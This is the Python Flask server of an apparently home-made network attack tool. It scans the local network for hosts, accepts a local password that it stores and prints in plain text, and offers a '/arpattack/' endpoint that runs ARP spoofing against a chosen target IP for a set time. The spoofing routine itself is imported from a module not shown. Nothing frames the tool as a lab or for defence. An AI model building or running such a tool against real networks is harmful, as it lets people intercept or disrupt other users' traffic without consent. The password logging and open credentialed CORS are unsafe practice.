import json
import sys
import traceback

from flask import Flask
from flask import request
from flask_cors import CORS

from tools import get_ip_list
from tools import arpspoof
from tools import get_gateway_ip
from tools import get_cur_ip


app = Flask(__name__)
CORS(app, supports_credentials=True)

PASS_WORD = None


@app.route('/setpass/', methods=['POST'])
def set_pass():
    if request.method == 'POST':
        print("posting...")
        global PASS_WORD
        data = request.get_json()['data']
        print("data", data)
        PASS_WORD = data['local_pass']
        print("lcoal_pass: ", PASS_WORD)
        return "password set done!"
    return ""


@app.route('/', methods=['GET'])
def get_ips():
    '''获取ip列表'''
    # try:
    if request.method == 'GET':
        print("getting...")
        ip_mac_map = get_ip_list()
        if len(ip_mac_map) < 20:
            print("获取ip过少，正在重新扫描....")
            ip_mac_map = get_ip_list()
        print(ip_mac_map)
        return json.dumps(ip_mac_map)
    else:
        print("func " + sys._getframe().f_code.co_name + " method error")
    # except:
        # return traceback.print_exc()


@app.route('/arpattack/', methods=['POST'])
def arp_attack():
    '''发起arp攻击'''
    try:
        if request.method == 'POST':
            data = request.get_json()['data']
            # print("data_type: ", data['data'])
            # data = json.loads(data)
            attack_time = int(data['attack_time'])
            target_ip = data['target_ip']
            print(attack_time)
            print(target_ip)

            cur_ip = get_cur_ip()
            gateway_ip = get_gateway_ip()

            arpspoof(gateway_ip, cur_ip, attack_time, target_ip)
            return "arp spoofing...."
        else:
            print("func " + sys._getframe().f_code.co_name + " method error")
    except:
        return traceback.print_exc()


if __name__ == "__main__":
    app.run()